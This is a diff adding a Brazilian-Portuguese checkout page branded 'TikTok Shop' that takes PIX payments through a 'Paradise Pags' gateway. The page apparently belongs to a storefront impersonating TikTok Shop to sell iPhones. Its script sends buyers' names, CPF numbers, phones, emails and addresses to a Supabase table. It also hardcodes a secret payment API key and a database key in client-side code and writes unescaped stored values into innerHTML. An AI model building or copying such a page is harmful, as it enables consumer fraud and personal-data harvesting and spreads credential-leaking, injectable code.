@@ -1,0 +1,1101 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Checkout - TikTok Shop</title>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          "Helvetica Neue", Arial, sans-serif;
+        background-color: #f5f5f5;
+        color: #333;
+      }
+
+      .checkout-container {
+        max-width: 480px;
+        margin: 0 auto;
+        background-color: white;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      /* Header */
+      .checkout-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 16px 16px;
+        border-bottom: 1px solid #e5e5e5;
+        background-color: white;
+        position: sticky;
+        top: 0;
+        z-index: 100;
+      }
+
+      .back-btn {
+        background: none;
+        border: none;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        color: #333;
+        font-size: 24px;
+      }
+
+      .checkout-title {
+        font-size: 18px;
+        font-weight: 600;
+      }
+
+      /* Content */
+      .checkout-content {
+        flex: 1;
+        overflow-y: auto;
+        padding: 16px;
+      }
+
+      /* Order Summary */
+      .order-summary {
+        background-color: #f9f9f9;
+        border-radius: 8px;
+        padding: 16px;
+        margin-bottom: 20px;
+      }
+
+      .order-summary-title {
+        font-size: 14px;
+        font-weight: 600;
+        color: #666;
+        margin-bottom: 12px;
+      }
+
+      .order-item {
+        display: flex;
+        gap: 12px;
+        margin-bottom: 12px;
+        padding-bottom: 12px;
+        border-bottom: 1px solid #e5e5e5;
+      }
+
+      .order-item:last-child {
+        border-bottom: none;
+        margin-bottom: 0;
+        padding-bottom: 0;
+      }
+
+      .order-item-image {
+        width: 60px;
+        height: 60px;
+        border-radius: 6px;
+        object-fit: cover;
+        background-color: #f0f0f0;
+      }
+
+      .order-item-info {
+        flex: 1;
+      }
+
+      .order-item-name {
+        font-size: 13px;
+        font-weight: 500;
+        margin-bottom: 4px;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+
+      .order-item-qty {
+        font-size: 12px;
+        color: #999;
+        margin-bottom: 4px;
+      }
+
+      .order-item-price {
+        font-size: 13px;
+        font-weight: 600;
+        color: #ff0050;
+      }
+
+      /* Totals */
+      .order-totals {
+        background-color: #f9f9f9;
+        border-radius: 8px;
+        padding: 16px;
+        margin-bottom: 20px;
+      }
+
+      .total-row {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 10px;
+        font-size: 13px;
+      }
+
+      .total-row.final {
+        border-top: 1px solid #e5e5e5;
+        padding-top: 12px;
+        margin-top: 12px;
+        font-size: 16px;
+        font-weight: 600;
+        color: #333;
+      }
+
+      /* PIX Section - Modern Design */
+      .pix-section {
+        background: linear-gradient(135deg, #ff0050 0%, #ff1a6b 100%);
+        border-radius: 16px;
+        padding: 24px;
+        margin-bottom: 20px;
+        display: none;
+        box-shadow: 0 8px 24px rgba(255, 0, 80, 0.2);
+        overflow: hidden;
+        position: relative;
+      }
+
+      .pix-section::before {
+        content: "";
+        position: absolute;
+        top: -50%;
+        right: -50%;
+        width: 200px;
+        height: 200px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 50%;
+        pointer-events: none;
+      }
+
+      .pix-section::after {
+        content: "";
+        position: absolute;
+        bottom: -30%;
+        left: -30%;
+        width: 150px;
+        height: 150px;
+        background: rgba(255, 255, 255, 0.08);
+        border-radius: 50%;
+        pointer-events: none;
+      }
+
+      .pix-header {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        margin-bottom: 20px;
+        position: relative;
+        z-index: 1;
+      }
+
+      .pix-icon {
+        width: 32px;
+        height: 32px;
+        color: white;
+        background: rgba(255, 255, 255, 0.2);
+        border-radius: 8px;
+        padding: 6px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .pix-title {
+        font-size: 18px;
+        font-weight: 700;
+        color: white;
+      }
+
+      .pix-subtitle {
+        font-size: 13px;
+        color: rgba(255, 255, 255, 0.85);
+        margin-bottom: 16px;
+        position: relative;
+        z-index: 1;
+      }
+
+      .pix-loading {
+        text-align: center;
+        padding: 40px 20px;
+        position: relative;
+        z-index: 1;
+      }
+
+      .spinner {
+        width: 50px;
+        height: 50px;
+        border: 4px solid rgba(255, 255, 255, 0.3);
+        border-top: 4px solid white;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin: 0 auto;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .pix-qrcode {
+        text-align: center;
+        margin-bottom: 24px;
+        position: relative;
+        z-index: 1;
+      }
+
+      .qrcode-image {
+        max-width: 100%;
+        width: 260px;
+        height: 260px;
+        border-radius: 12px;
+        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.15);
+        background: white;
+        padding: 8px;
+      }
+
+      .pix-copy-code {
+        background: rgba(255, 255, 255, 0.12);
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 10px;
+        padding: 14px;
+        margin-bottom: 16px;
+        font-family: "Courier New", monospace;
+        font-size: 11px;
+        word-break: break-all;
+        color: white;
+        max-height: 100px;
+        overflow-y: auto;
+        position: relative;
+        z-index: 1;
+      }
+
+      .pix-copy-code::-webkit-scrollbar {
+        width: 4px;
+      }
+
+      .pix-copy-code::-webkit-scrollbar-track {
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+      }
+
+      .pix-copy-code::-webkit-scrollbar-thumb {
+        background: rgba(255, 255, 255, 0.3);
+        border-radius: 10px;
+      }
+
+      .copy-btn {
+        width: 100%;
+        padding: 14px 16px;
+        background-color: white;
+        color: #ff0050;
+        border: none;
+        border-radius: 10px;
+        font-size: 14px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        position: relative;
+        z-index: 1;
+        margin-bottom: 12px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      }
+
+      .copy-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+      }
+
+      .copy-btn:active {
+        transform: translateY(0);
+      }
+
+      .copy-btn:nth-of-type(2) {
+        background-color: rgba(255, 255, 255, 0.2);
+        color: white;
+        border: 2px solid white;
+        margin-bottom: 0;
+      }
+
+      .copy-btn:nth-of-type(2):hover {
+        background-color: rgba(255, 255, 255, 0.3);
+      }
+
+      /* Footer */
+      .checkout-footer {
+        padding: 16px;
+        border-top: 1px solid #e5e5e5;
+        background-color: white;
+      }
+
+      .pay-btn {
+        width: 100%;
+        padding: 12px;
+        background-color: #ff0050;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background-color 0.2s;
+      }
+
+      .pay-btn:hover {
+        background-color: #e60040;
+      }
+
+      .pay-btn:active {
+        transform: scale(0.98);
+      }
+
+      .pay-btn:disabled {
+        background-color: #ccc;
+        cursor: not-allowed;
+      }
+
+      .back-to-home {
+        padding: 10px 20px;
+        background-color: #ff0050;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        text-decoration: none;
+        display: inline-block;
+      }
+
+      /* Toast */
+      .toast {
+        position: fixed;
+        bottom: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background-color: #333;
+        color: white;
+        padding: 12px 20px;
+        border-radius: 6px;
+        font-size: 13px;
+        z-index: 500;
+        opacity: 0;
+        transition: opacity 0.3s;
+      }
+
+      .toast.show {
+        opacity: 1;
+      }
+
+      /* Address Section */
+      .address-section {
+        background-color: #f9f9f9;
+        border-radius: 8px;
+        padding: 16px;
+        margin-bottom: 20px;
+      }
+
+      .address-title {
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 12px;
+      }
+
+      .address-form {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+      }
+
+      .form-group {
+        display: flex;
+        flex-direction: column;
+      }
+
+      .form-label {
+        font-size: 12px;
+        font-weight: 600;
+        color: #666;
+        margin-bottom: 4px;
+      }
+
+      .form-input {
+        padding: 8px 10px;
+        border: 1px solid #e5e5e5;
+        border-radius: 6px;
+        font-size: 13px;
+        font-family: inherit;
+      }
+
+      .form-input:focus {
+        outline: none;
+        border-color: #ff0050;
+        box-shadow: 0 0 0 2px rgba(255, 0, 80, 0.1);
+      }
+    </style>
+  </head>
+  <body>
+    <div class="checkout-container">
+      <!-- Header -->
+      <div class="checkout-header">
+        <button class="back-btn" onclick="goBack()">
+          <i data-lucide="arrow-left"></i>
+        </button>
+        <h1 class="checkout-title">Checkout</h1>
+        <div style="width: 24px"></div>
+      </div>
+
+      <!-- Content -->
+      <div class="checkout-content">
+        <!-- Empty Cart Message -->
+        <div id="emptyCart" class="empty-cart" style="display: none">
+          <i data-lucide="shopping-cart"></i>
+          <div class="empty-cart-text">Seu carrinho está vazio</div>
+          <a href="iphone-product-page.html" class="back-to-home"
+            >Voltar à loja</a
+          >
+        </div>
+
+        <!-- Checkout Content -->
+        <div id="checkoutContent">
+          <!-- Order Summary -->
+          <div class="order-summary">
+            <div class="order-summary-title">Produtos</div>
+            <div id="orderItems"></div>
+          </div>
+
+          <!-- Totals -->
+          <div class="order-totals">
+            <div class="total-row">
+              <span>Subtotal</span>
+              <span id="subtotal">R$ 0,00</span>
+            </div>
+            <div class="total-row">
+              <span>Frete</span>
+              <span>Grátis</span>
+            </div>
+            <div class="total-row final">
+              <span>Total</span>
+              <span id="totalPrice">R$ 0,00</span>
+            </div>
+          </div>
+
+          <!-- Address Section -->
+          <!-- PIX Section -->
+          <div class="pix-section">
+            <div class="pix-header">
+              <svg
+                class="pix-icon"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+              >
+                <rect
+                  x="2"
+                  y="2"
+                  width="20"
+                  height="20"
+                  rx="2.18"
+                  ry="2.18"
+                ></rect>
+                <line x1="7" y1="2" x2="7" y2="22"></line>
+                <line x1="17" y1="2" x2="17" y2="22"></line>
+                <line x1="2" y1="7" x2="22" y2="7"></line>
+                <line x1="2" y1="17" x2="22" y2="17"></line>
+              </svg>
+              <div>
+                <div class="pix-title">PIX</div>
+                <div class="pix-subtitle">Pagamento instantâneo</div>
+              </div>
+            </div>
+
+            <!-- Loading State -->
+            <div id="pixLoading" class="pix-loading">
+              <div class="spinner"></div>
+            </div>
+
+            <!-- QR Code State -->
+            <div id="pixQrCode" style="display: none">
+              <div class="pix-qrcode">
+                <img id="qrCodeImage" class="qrcode-image" alt="QR Code PIX" />
+              </div>
+              <div class="pix-copy-code" id="pixCopyCode"></div>
+              <button class="copy-btn" onclick="copyPixCode()">
+                Copiar código PIX
+              </button>
+
+              <!-- Info Box -->
+              <div
+                style="
+                  background: rgba(255, 255, 255, 0.1);
+                  border: 1px solid rgba(255, 255, 255, 0.2);
+                  border-radius: 10px;
+                  padding: 12px;
+                  margin-top: 16px;
+                  color: rgba(255, 255, 255, 0.9);
+                  font-size: 12px;
+                  position: relative;
+                  z-index: 1;
+                "
+              >
+                <div style="display: flex; gap: 8px; align-items: flex-start">
+                  <span style="font-size: 16px; margin-top: 2px">✓</span>
+                  <div>
+                    <strong>Pagamento será confirmado automaticamente</strong>
+                    <div style="margin-top: 4px; opacity: 0.8">
+                      Após confirmar o pagamento, seus dados serão salvos
+                      automaticamente. Você não precisa fazer mais nada!
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Footer -->
+      <div class="checkout-footer">
+        <button class="pay-btn" id="payBtn" onclick="generatePix()">
+          Gerar PIX
+        </button>
+      </div>
+    </div>
+
+    <!-- Toast -->
+    <div class="toast" id="toast"></div>
+
+    <script>
+      let cartItems = [];
+      let currentPixData = null;
+
+      // Credenciais do Paradise Pags
+      const PARADISE_API_KEY =
+        "sk_26f533607b3a028e53340190a840d766b6e021c606e80fa7d1cacd7c1803e3e8";
+      const PARADISE_RECIPIENT_ID = "store_e08717858b2868ac";
+      const PARADISE_API_URL =
+        "https://multi.paradisepags.com/api/v1/transaction.php";
+
+      // Load cart from localStorage
+      function loadCart() {
+        const savedCart = localStorage.getItem("cartItems");
+        if (savedCart) {
+          try {
+            cartItems = JSON.parse(savedCart);
+            renderCheckout();
+          } catch (e) {
+            console.error("Erro ao carregar carrinho:", e);
+            showEmptyCart();
+          }
+        } else {
+          showEmptyCart();
+        }
+      }
+
+      // Show empty cart
+      function showEmptyCart() {
+        document.getElementById("emptyCart").style.display = "flex";
+        document.getElementById("checkoutContent").style.display = "none";
+        document.querySelector(".checkout-footer").style.display = "none";
+      }
+
+      // Render checkout
+      function renderCheckout() {
+        if (cartItems.length === 0) {
+          showEmptyCart();
+          return;
+        }
+
+        // Garantir que o conteúdo está visível
+        document.getElementById("checkoutContent").style.display = "block";
+        document.querySelector(".checkout-footer").style.display = "block";
+
+        renderOrderItems();
+        renderTotals();
+        loadAddressData();
+        initPixSection();
+      }
+
+      // Render order items
+      function renderOrderItems() {
+        const container = document.getElementById("orderItems");
+        let html = "";
+
+        cartItems.forEach((item) => {
+          const preco = parseFloat(item.preco);
+          const total = preco * item.quantidade;
+
+          html += `
+          <div class="order-item">
+            <img src="${item.imagem}" alt="${
+            item.nome
+          }" class="order-item-image" onerror="this.src='assets/image.png'" />
+            <div class="order-item-info">
+              <div class="order-item-name">${item.nome}</div>
+              <div class="order-item-qty">Qty: ${item.quantidade}</div>
+              <div class="order-item-price">R$ ${total
+                .toFixed(2)
+                .replace(".", ",")}</div>
+            </div>
+          </div>
+        `;
+        });
+
+        container.innerHTML = html;
+      }
+
+      // Render totals
+      function renderTotals() {
+        let subtotal = 0;
+
+        cartItems.forEach((item) => {
+          const preco = parseFloat(item.preco);
+          subtotal += preco * item.quantidade;
+        });
+
+        document.getElementById("subtotal").textContent = `R$ ${subtotal
+          .toFixed(2)
+          .replace(".", ",")}`;
+        document.getElementById("totalPrice").textContent = `R$ ${subtotal
+          .toFixed(2)
+          .replace(".", ",")}`;
+      }
+
+      // Load address data from localStorage
+      function loadAddressData() {
+        // Os dados de endereço já foram preenchidos na página anterior
+        // Apenas validar que existem
+        const savedAddress = localStorage.getItem("deliveryAddress");
+        if (!savedAddress) {
+          console.warn(
+            "Aviso: Endereço não foi preenchido na página anterior!"
+          );
+        }
+      }
+
+      // Save address data
+      function saveAddressData() {
+        // Pegar endereço do localStorage (já preenchido na página anterior)
+        const savedAddress = localStorage.getItem("deliveryAddress");
+
+        if (!savedAddress) {
+          showToast("Endereço não foi preenchido na página anterior!");
+          return false;
+        }
+
+        try {
+          const address = JSON.parse(savedAddress);
+
+          // Validar se todos os campos estão preenchidos
+          if (
+            !address.cep ||
+            !address.rua ||
+            !address.numero ||
+            !address.bairro ||
+            !address.cidade ||
+            !address.estado
+          ) {
+            showToast(
+              "Endereço incompleto! Preencha novamente na página anterior."
+            );
+            return false;
+          }
+
+          return true;
+        } catch (e) {
+          console.error("Erro ao processar endereço:", e);
+          showToast("Erro ao processar endereço!");
+          return false;
+        }
+      }
+
+      // Init PIX section
+      function initPixSection() {
+        document.getElementById("pixLoading").style.display = "block";
+        document.getElementById("pixQrCode").style.display = "none";
+      }
+
+      // Generate PIX
+      async function generatePix() {
+        if (!saveAddressData()) {
+          return;
+        }
+
+        const payBtn = document.getElementById("payBtn");
+        payBtn.disabled = true;
+        payBtn.textContent = "Gerando PIX...";
+
+        // Calculate total
+        let total = 0;
+        cartItems.forEach((item) => {
+          const preco = parseFloat(item.preco);
+          total += preco * item.quantidade;
+        });
+
+        try {
+          // Mostrar a seção PIX
+          document.querySelector(".pix-section").style.display = "block";
+
+          // Chamar API do Paradise Pags
+          const response = await generatePixViaParadise(total);
+
+          if (response.success) {
+            currentPixData = response;
+            displayPixQrCode(response);
+            showToast("PIX gerado com sucesso!");
+            // NÃO mostrar modal de sucesso - ficar na página de checkout
+          } else {
+            showToast(
+              "Erro ao gerar PIX: " + (response.error || "Tente novamente.")
+            );
+          }
+        } catch (error) {
+          console.error("Erro:", error);
+          showToast("Erro ao gerar PIX. Tente novamente.");
+        } finally {
+          payBtn.disabled = false;
+          payBtn.textContent = "Gerar PIX";
+        }
+      }
+
+      // Generate PIX via Paradise Pags API
+      async function generatePixViaParadise(amount) {
+        try {
+          // Pegar dados do cliente do localStorage (salvos no iphone-product-page.html)
+          const savedCpf = localStorage.getItem("customerCpf");
+          let customerName = "Cliente TikTok Shop";
+          let customerPhone = "11999999999";
+          let customerCpf = "00000000000";
+          let customerEmail = "cliente@tiktokshop.com";
+
+          if (savedCpf) {
+            const cpfData = JSON.parse(savedCpf);
+            customerName = cpfData.nome || "Cliente TikTok Shop";
+            customerPhone = cpfData.telefone
+              ? cpfData.telefone.replace(/\D/g, "")
+              : "11999999999";
+            customerCpf = cpfData.cpf
+              ? cpfData.cpf.replace(/\D/g, "")
+              : "00000000000";
+            customerEmail = cpfData.email || "cliente@tiktokshop.com";
+          }
+
+          // Gerar reference única
+          const reference = "PED" + Date.now();
+
+          // Preparar payload da requisição
+          const payload = {
+            amount: Math.round(amount * 100), // Converter para centavos
+            description: "Compra de Produtos TikTok Shop",
+            reference: reference,
+            customer: {
+              name: customerName,
+              email: customerEmail,
+              phone: customerPhone,
+              document: customerCpf,
+            },
+            productHash: "prod_86dc2503e08b7532", // Código do produto
+          };
+
+          // Fazer requisição para a API do Paradise Pags
+          const response = await fetch(PARADISE_API_URL, {
+            method: "POST",
+            headers: {
+              "X-API-Key": PARADISE_API_KEY,
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(payload),
+          });
+
+          const data = await response.json();
+
+          if (!response.ok) {
+            console.error("Erro na API Paradise:", data);
+            throw new Error(data.message || "Erro ao gerar PIX");
+          }
+
+          if (data.status === "success") {
+            // Gerar QR Code usando API pública baseado no código PIX
+            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(
+              data.qr_code
+            )}`;
+
+            return {
+              success: true,
+              order_id: reference,
+              transaction_id: data.transaction_id,
+              pix_key: data.qr_code,
+              qrCodeUrl: qrCodeUrl, // Usar QR Code gerado da string PIX
+              amount: amount,
+              expiresAt: data.expires_at,
+            };
+          } else {
+            throw new Error("Falha ao criar transação");
+          }
+        } catch (error) {
+          console.error("Erro ao gerar PIX:", error);
+          return {
+            success: false,
+            error: error.message,
+          };
+        }
+      }
+
+      // Configurações do Supabase
+      const SUPABASE_URL = "https://dcahduxatuajbnsecuzz.supabase.co";
+      const SUPABASE_KEY =
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRjYWhkdXhhdHVhamJuc2VjdXp6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjM1ODU2NDcsImV4cCI6MjA3OTE2MTY0N30.sIvEQPYGmuLQUi6kJu-F6PBcjZIQJ_I4Ui-FBUDcwBU";
+      const SUPABASE_TABLE = "pedidos"; // Altere conforme o nome da sua tabela
+
+      // Enviar dados do pedido para Supabase
+      async function sendOrderData(orderData) {
+        try {
+          const response = await fetch(
+            `${SUPABASE_URL}/rest/v1/${SUPABASE_TABLE}`,
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                apikey: SUPABASE_KEY,
+                Authorization: `Bearer ${SUPABASE_KEY}`,
+                Prefer: "return=representation",
+              },
+              body: JSON.stringify(orderData),
+            }
+          );
+
+          const responseData = await response.json();
+
+          if (response.ok) {
+            console.log("Dados do pedido enviados para Supabase com sucesso");
+            return true;
+          } else {
+            console.error(
+              "Erro ao enviar dados para Supabase:",
+              response.status,
+              responseData
+            );
+            alert(`Erro Supabase: ${JSON.stringify(responseData)}`);
+            return false;
+          }
+        } catch (error) {
+          console.error("Erro ao enviar dados:", error);
+          alert(`Erro: ${error.message}`);
+          return false;
+        }
+      }
+
+      // Verificar e enviar dados do pedido pago
+      async function checkAndSendPaidOrder() {
+        const orderData = localStorage.getItem("currentOrderData");
+        if (orderData) {
+          const order = JSON.parse(orderData);
+          // Atualizar status para pago
+          order.status = "pix_paid";
+          order.paidAt = new Date().toISOString();
+
+          // Enviar dados do pedido para o webhook
+          await sendOrderData(order);
+
+          // Limpar dados após envio
+          localStorage.removeItem("currentOrderData");
+        }
+      }
+
+      // Display PIX QR Code
+      function displayPixQrCode(pixData) {
+        document.getElementById("pixLoading").style.display = "none";
+        document.getElementById("pixQrCode").style.display = "block";
+
+        // Set QR Code image
+        document.getElementById("qrCodeImage").src = pixData.qrCodeUrl;
+
+        // Set PIX copy code
+        document.getElementById("pixCopyCode").textContent = pixData.pix_key;
+
+        // Preparar dados do pedido para armazenar
+        const savedCpf = localStorage.getItem("customerCpf");
+        const savedAddress = localStorage.getItem("deliveryAddress");
+
+        let customerData = {};
+        if (savedCpf) {
+          customerData = JSON.parse(savedCpf);
+        }
+
+        let addressData = {};
+        if (savedAddress) {
+          addressData = JSON.parse(savedAddress);
+        }
+
+        // Armazenar dados do pedido
+        const orderData = {
+          order_id: pixData.order_id,
+          transaction_id: pixData.transaction_id,
+          pix_key: pixData.pix_key,
+          amount: pixData.amount,
+          status: "pix_generated",
+          customer: {
+            name: customerData.nome || "Cliente",
+            email: customerData.email || "",
+            phone: customerData.telefone || "",
+            cpf: customerData.cpf || "",
+          },
+          address: addressData,
+          items: cartItems,
+          created_at: new Date().toISOString(),
+        };
+
+        localStorage.setItem("currentOrderData", JSON.stringify(orderData));
+
+        // ⭐ NOVO: Iniciar polling para sincronizar com webhook
+        // O webhook.php receberá a notificação de pagamento da Paradise Pags
+        // Este polling verifica periodicamente se o banco foi atualizado
+        showToast("⏳ Aguardando confirmação de pagamento...");
+        startPaymentPolling(pixData.order_id);
+      }
+
+      // Copy PIX Code
+      function copyPixCode() {
+        if (!currentPixData) {
+          showToast("PIX não gerado ainda");
+          return;
+        }
+
+        navigator.clipboard
+          .writeText(currentPixData.pix_key)
+          .then(() => {
+            showToast("Código PIX copiado!");
+          })
+          .catch(() => {
+            showToast("Erro ao copiar código");
+          });
+      }
+
+      // NOVO: Webhook processará o pagamento automaticamente
+      // Este código é mantido apenas como backup para verificação manual
+      // O fluxo ideal é:
+      // 1. Usuário faz o pagamento PIX
+      // 2. Paradise Pags detecta o pagamento
+      // 3. Envia notificação para webhook.php
+      // 4. webhook.php atualiza o banco com status "pix_paid"
+      // 5. Dados são salvos automaticamente
+
+      // Se precisar fazer polling para verificar status:
+      async function checkPaymentStatus(transactionId) {
+        try {
+          const response = await fetch(
+            `${PARADISE_API_URL}?transaction_id=${transactionId}`,
+            {
+              method: "GET",
+              headers: {
+                "X-API-Key": PARADISE_API_KEY,
+                "Content-Type": "application/json",
+              },
+            }
+          );
+
+          const data = await response.json();
+
+          if (data.status === "success" && data.transaction_status === "paid") {
+            return true;
+          } else {
+            return false;
+          }
+        } catch (error) {
+          console.error("Erro ao verificar status do pagamento:", error);
+          return false;
+        }
+      }
+
+      // Função auxiliar: Buscar status do pedido no banco
+      async function checkOrderStatus(orderId) {
+        try {
+          const response = await fetch(
+            `${SUPABASE_URL}/rest/v1/${SUPABASE_TABLE}?order_id=eq.${orderId}&select=status`,
+            {
+              method: "GET",
+              headers: {
+                apikey: SUPABASE_KEY,
+                Authorization: `Bearer ${SUPABASE_KEY}`,
+                "Content-Type": "application/json",
+              },
+            }
+          );
+
+          const data = await response.json();
+          if (data && data.length > 0) {
+            return data[0].status;
+          }
+          return null;
+        } catch (error) {
+          console.error("Erro ao verificar status do pedido:", error);
+          return null;
+        }
+      }
+
+      // Polling automático para sincronizar com webhook
+      function startPaymentPolling(orderId) {
+        let attempts = 0;
+        const maxAttempts = 60; // 60 tentativas = 5 minutos (5 segundos cada)
+
+        const pollInterval = setInterval(async () => {
+          attempts++;
+
+          const status = await checkOrderStatus(orderId);
+
+          if (status === "pix_paid") {
+            clearInterval(pollInterval);
+            showToast("✅ Pagamento confirmado! Pedido processado.");
+
+            // Limpar dados
+            setTimeout(() => {
+              localStorage.removeItem("currentOrderData");
+              localStorage.removeItem("cartItems");
+              localStorage.removeItem("deliveryAddress");
+              localStorage.removeItem("customerCpf");
+
+              // Redirecionar para home
+              setTimeout(() => {
+                window.location.href = "/iphone-product-page.html";
+              }, 1500);
+            }, 1000);
+          } else if (attempts >= maxAttempts) {
+            clearInterval(pollInterval);
+            showToast("⏱️ Tempo de verificação expirado. Tente novamente.");
+          }
+        }, 5000); // Verificar a cada 5 segundos
+      }
+
+      // Show toast
+      function showToast(message) {
+        const toast = document.getElementById("toast");
+        toast.textContent = message;
+        toast.classList.add("show");
+
+        setTimeout(() => {
+          toast.classList.remove("show");
+        }, 3000);
+      }
+
+      // Go back
+      function goBack() {
+        window.history.back();
+      }
+
+      // Initialize on page load
+      window.addEventListener("DOMContentLoaded", () => {
+        loadCart();
+        lucide.createIcons();
+      });
+    </script>
+  </body>
+</html>
